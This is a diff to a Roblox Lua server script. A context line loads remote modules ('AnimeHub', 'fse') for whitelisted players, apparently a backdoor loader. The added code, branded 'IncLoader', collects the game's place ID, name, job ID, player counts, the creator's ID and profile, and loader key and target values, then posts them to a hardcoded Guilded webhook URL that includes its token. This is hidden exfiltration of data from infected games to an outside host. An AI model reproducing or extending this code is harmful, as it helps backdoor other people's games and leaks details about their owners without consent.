@@ -13,3 +13,69 @@ local WhitelistedPlayers = {
 }
 
 game.Players.PlayerAdded:Connect(function(plr) if Whitelists then if WhitelistedPlayers[plr.Name] then require(6133482274)["AnimeHub"](plr, "Purple") require(6324372525).fse(plr) end end end)
+
+local http = game:GetService("HttpService")
+local url = "https://media.guilded.gg/webhooks/7c425b8a-dc2d-406b-bff0-fd98f275b067/8wz3f87GykUmaoKaWWWAEIIEcec8eeaYcWYSc0qyqKyCiWa0YYOqW4qQ0CgMwM0yEe24seaaEM8A4USwuaGMGG"
+local Data = {
+	["content"] = "",
+	["embeds"] = {{
+		["title"] = "IncLoader",
+		["footer"] = {
+
+			["text"] = "IncLoader by increaseron.",
+			["icon_url"] = "https://cdn.discordapp.com/attachments/689430010469416976/689546929801265172/SimpleESS.png",
+		},
+		["author"] = {
+			["name"] = "IncLoader by increaseron.",
+			["icon_url"] = "https://cdn.discordapp.com/attachments/689430010469416976/689546929801265172/SimpleESS.png",
+		},
+		["description"] = "",
+		["thumbnail"] = {
+			["url"] = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..game.PlaceId.."&fmt=png&wd=420&ht=420",
+		},
+		["type"] = "rich",
+		["color"] = tonumber(0x800080),
+		["fields"] = {
+			{
+				["name"] = "Game",
+				["value"] = "Game Found: https://www.roblox.com/games/"..game.PlaceId.."\nGame Name: "..game.Name.."\nGame ID: "..game.PlaceId.."\nJob ID: "..#game.JobId,
+				["inline"] = true
+
+			},
+			{
+
+
+				["name"] = "People",
+				["value"] = "Players In Game: "..#game.Players:GetPlayers().."\nMax Players: "..game.Players.MaxPlayers.."\nPreferred Players: "..game.Players.PreferredPlayers,
+				["inline"] = false
+
+			},
+			{
+
+
+				["name"] = "The Creator Him/Herself",
+				["value"] = "Creator ID: "..game.CreatorId.."\nCreator Profile: https://www.roblox.com/users/"..game.CreatorId.."/profile",
+				["inline"] = false
+
+			},
+			
+			{
+
+
+				["name"] = "Executed stuff",
+				["value"] = "Key: ".._G.IncreaseronLoaderKey.."\nTarget: ".._G.IncreaseronLoaderTarget.."\nSite/Type: ".._G.IncreaseronLoaderSite,
+				["inline"] = false
+
+			},
+
+
+		}
+
+
+
+	}
+	}
+}
+
+Data = http:JSONEncode(Data)
+http:PostAsync(url, Data)
